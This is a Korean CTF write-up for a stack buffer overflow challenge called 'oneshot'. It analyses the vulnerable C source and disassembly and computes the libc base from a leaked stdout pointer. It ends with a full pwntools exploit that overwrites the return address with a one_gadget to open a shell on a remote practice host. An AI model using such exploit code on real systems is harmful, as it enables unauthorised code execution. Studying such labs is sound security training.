#one_gadget #스택버퍼오버플로우 
### 1.  파일분석

file ./oneshot
./oneshot: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3322bf58c3f5ac401cd00bd9d0d75762abed89f0, not stripped

$ checksec oneshot
[*]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

실습 환경은 ASLR이 적용되어 있고, 바이너리에는 NX, PIE가 적용되어 있다. Canary는 적용되어 있지 않다.
PIE가 적용되어 있기 때문에, PIE base를 알아내지 않고서는 바이너리의 원하는 함수의 주소를 알 수 없다.
### 2. C 소스파일 분석
``` c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie
// -fno-stack-protector → **스택 카나리(Stack Canary)**를 비활성화해서 스택 버퍼 오버플로우 공격이 가능하게 만듦.
// -fPIC -pie → PIE(Position Independent Executable) 실행 파일로 빌드됨. 실행할 때마다 코드 영역이 랜덤한 주소에 매핑되어 ASLR의 영향을 받음.
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    // stdout이 주소를 출력함 -> libc의 메모리 주소를 누출(leak) 가능.
    // PIE와 libc 베이스 주소를 계산하는데 사용됨.
    // 즉, ASLR 우회 정보를 제공
    printf("stdout: %p\n", stdout);

    // msg 크기는 16바이트인데, read 로 최대 46바이트 입력받음. 버퍼 오버플로우 발생 가능.
    // msg 뒤에 있는 check 변수, SFP, RET 등을 덮어쓸 수 있음.
    printf("MSG: ");
    read(0, msg, 46);

    // check 변수는 기본적으로 0이지만, 오버플로우로 값을 덮어쓰면 강제 종료됨.
    if(check > 0) {
        exit(0);
    }

    // msg 배열(16바이트)을 0으로 초기화(지움) 하는 코드
    // sizeof(msg) -> msg배열 크기인 16바이트.
    // 따라서 msg[0] 부터 msg[15]까지 전부 0x00 으로 채워짐.
    // 즉, 입력받은 문자열을 출력한 뒤에 msg를 전부 지워서 흔적을 없애는 동작.
    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

libc 에 존재하는 stdout의 주소를 알려주기 때문에 libc base를 구할 수 있을 것 같다.
46바이트만 read 함수가 읽어온다. 또한 check > 0 일 경우 실행을 종료한다.
memset(msg, 0, sizeof(msg)); 을 실행하여 버퍼 안에 원하는 값을 작성하는 것 또한 불가능하다.
Canary를 알아낼 필요는 없다.

46바이트가 몇 바이트의 버퍼 오버플로우를 일으키는지 확인해 보자
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000000a41 <+0>:     push   rbp
   0x0000000000000a42 <+1>:     mov    rbp,rsp
   0x0000000000000a45 <+4>:     sub    rsp,0x30
   0x0000000000000a49 <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x0000000000000a4c <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x0000000000000a50 <+15>:    mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000000a58 <+23>:    mov    eax,0x0
   0x0000000000000a5d <+28>:    call   0x9da <initialize>
   0x0000000000000a62 <+33>:    mov    rax,QWORD PTR [rip+0x200567]        # 0x200fd0
   0x0000000000000a69 <+40>:    mov    rax,QWORD PTR [rax]
   0x0000000000000a6c <+43>:    mov    rsi,rax
   0x0000000000000a6f <+46>:    lea    rdi,[rip+0x107]        # 0xb7d
   0x0000000000000a76 <+53>:    mov    eax,0x0
   0x0000000000000a7b <+58>:    call   0x800 <printf@plt>
   0x0000000000000a80 <+63>:    lea    rdi,[rip+0x102]        # 0xb89
   0x0000000000000a87 <+70>:    mov    eax,0x0
   0x0000000000000a8c <+75>:    call   0x800 <printf@plt>
   0x0000000000000a91 <+80>:    lea    rax,[rbp-0x20]
   0x0000000000000a95 <+84>:    mov    edx,0x2e
   0x0000000000000a9a <+89>:    mov    rsi,rax
   0x0000000000000a9d <+92>:    mov    edi,0x0
   0x0000000000000aa2 <+97>:    call   0x830 <read@plt>
   0x0000000000000aa7 <+102>:   cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000000aac <+107>:   je     0xab8 <main+119>
   0x0000000000000aae <+109>:   mov    edi,0x0
   0x0000000000000ab3 <+114>:   call   0x870 <exit@plt>
   0x0000000000000ab8 <+119>:   lea    rax,[rbp-0x20]
   0x0000000000000abc <+123>:   mov    rsi,rax
   0x0000000000000abf <+126>:   lea    rdi,[rip+0xc9]        # 0xb8f
   0x0000000000000ac6 <+133>:   mov    eax,0x0
   0x0000000000000acb <+138>:   call   0x800 <printf@plt>
   0x0000000000000ad0 <+143>:   lea    rax,[rbp-0x20]
   0x0000000000000ad4 <+147>:   mov    edx,0x10
   0x0000000000000ad9 <+152>:   mov    esi,0x0
   0x0000000000000ade <+157>:   mov    rdi,rax
   0x0000000000000ae1 <+160>:   call   0x810 <memset@plt>
   0x0000000000000ae6 <+165>:   mov    eax,0x0
   0x0000000000000aeb <+170>:   leave
   0x0000000000000aec <+171>:   ret
End of assembler dump.
```
msg = [rbp-0x20] 이기 때문에, 버퍼 뒤로 46 - 0x20 = 14 바이트를 덮을 수 있다. 즉 SFP의 8바이트와 RET의 하위 6바이트만을 덮을 수 있다.

RET의 6바이트밖에 덮을 수 없고, 다른 영역에 작성 또한 어려워 ROP 체인을 사용하는 것은 어렵다.
따라서 libc의 one_gadget을 사용한 풀이를 진행해 보자.

### 3. 익스플로잇

#### 1). libc base 계산
C 코드에서 stdout 의 이름을 가지는 변수가 libc에서 실제로 어떤 값을 참조하는 지 pwngdbg을 사용해서 확인.
```
   0x0000000000000a62 <+33>:    mov    rax,QWORD PTR [rip+0x200567]        # 0x200fd0
   0x0000000000000a69 <+40>:    mov    rax,QWORD PTR [rax]
   0x0000000000000a6c <+43>:    mov    rsi,rax
   0x0000000000000a6f <+46>:    lea    rdi,[rip+0x107]        # 0xb7d
   0x0000000000000a76 <+53>:    mov    eax,0x0
   0x0000000000000a7b <+58>:    call   0x800 <printf@plt>
```

```
*RAX  0x7ffff7fa0868 (stdout) —▸ 0x7ffff7fa0780 (_IO_2_1_stdout_) ◂— 0xfbad2087
```

```
*RAX  0x7ffff7fa0780 (_IO_2_1_stdout_) ◂— 0xfbad2087
```

stdout 이 가리키는 값은 libc의 \_IO_2_1_stdout 심볼임을 알 수 있다.

``` python
from pwn import *

# p = process("./oneshot")
p = remote("host8.dreamhack.games", 18807)
e = ELF("./oneshot")
libc = ELF("libc.so.6") # 서버에서 쓰는 libc 파일 로컬 복사본을 ELF 객체로 불러옴.(심볼 주소 계산, offset 구할 때 사용.)

# 서버가 실행되면 "stdout: " 문자열까지 받기
# 다음으로 들어오는 stdout 변수의 주소값을 recvline()으로 받아서 정수로 변환
# 즉 libc 주소 leak
p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)

# stdout 은 libc 안의 전역변수 _IO_2_1_stdout_ 의 주소임.
# 따라서 stdout_addr - offset = libc가 메모리에 로드된 base 주소
# 이제 libc 내 다른 함수 (system, execve, one_gadget 등) 주소를 계산할 수 있음.
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
```

#### 2) one_gadget

주어진 libc인 libc.so.6 에 존재하는 one_gadget 확인

```
$ one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

```
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
```

전부 실행시 필요한 조건들이 각기 존재하나, 먼저 4개의 one_gadget들을 가져와 시도해 보기
이 또한 libc에 존재하기 때문에 libc_base 와 더하여 사용해야 한다.

``` python
'''
og -> one_gadget 오프셋들
(one_gadget libc.so.6 명령으로 구한 결과를 하드코딩한 것)
libc_base + 0x45216 를 최종 payload의 RIP(return address)로 넣어 실행.
즉, execve("/bin/sh",..) 조건을 만족하는 가젯으로 점프 
'''
og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
og = og[0] + libc_base

print(hex(libc_base))

'''
msg[16] -> 버퍼
그 뒤에 check(8바이트) -> 오버플로우로 덮을 수 있음
그 뒤에 saved RBP(8바이트)
그 뒤에 saved RIP(리턴 주소)
즉, 오버플로우를 이용해 RIP를 one_gadget 주소로 덮는 게 목적
'''
payload = b"\x00" * 0x20
payload += b"A" * 8
payload += p64(og)[:8]

# 프로그램이 "MSG: " 출력할 때 payload 전송
# 즉 read(0, msg, 46) 호출될 때 우리가 만든 payload를 그대로 스택에 씀.
p.sendafter(b"MSG: ", payload)
p.recvline()

p.interactive()
```